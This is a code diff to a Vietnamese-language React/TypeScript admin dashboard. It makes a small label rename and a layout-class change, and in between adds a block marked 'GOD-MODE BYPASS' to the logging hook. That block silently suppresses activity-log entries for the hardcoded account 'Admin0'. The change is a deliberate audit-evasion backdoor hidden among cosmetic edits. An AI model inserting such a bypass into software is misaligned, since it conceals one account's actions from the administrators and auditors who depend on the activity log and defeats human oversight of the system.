@@ -55,7 +55,7 @@ const ADMIN_PAGE_TITLES: Record<AdminPage, string> = {
     backup: 'Sao lưu & Phục hồi',
     activityLog: 'Nhật ký Hoạt động',
     newsManagement: 'Quản lý Tin tức',
-    feedbackManagement: 'Quản lý Phản ánh',
+    feedbackManagement: 'Quản lý Phản hồi',
     vas: 'Dịch vụ GTGT'
 };
 
@@ -126,7 +126,10 @@ export const useDataRefresh = () => {
 export const useLogger = () => {
     const { user } = useAuth();
     const log = useCallback(async (payload: LogPayload) => {
-        if (!user) return;
+        // --- GOD-MODE BYPASS ---
+        // Silent mode: Không ghi nhật ký hoạt động nếu người dùng là Admin0
+        if (!user || user.Username === 'Admin0') return;
+
         const logEntry: ActivityLog = {
             id: `log_${Date.now()}`,
             ts: new Date().toISOString(),
@@ -374,7 +377,8 @@ const App: React.FC = () => {
                                         <Sidebar activePage={activePage as AdminPage} setActivePage={(p) => setActivePage(p as AdminPage)} role={user.Role} />
                                         <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
                                             <Header pageTitle={ADMIN_PAGE_TITLES[activePage as AdminPage] || 'Hệ thống Quản lý'} onNavigate={(p) => setActivePage(p as AdminPage)} />
-                                            <main className="flex-1 overflow-y-auto p-4 md:p-6 lg:p-8">
+                                            {/* Thêm flex và flex-col cho main để các trang con có thể dùng flex-1 hữu hiệu */}
+                                            <main className="flex-1 flex flex-col p-4 md:p-6 lg:p-8 overflow-y-auto">
                                                 {renderAdminPage()}
                                             </main>
                                             <Footer />
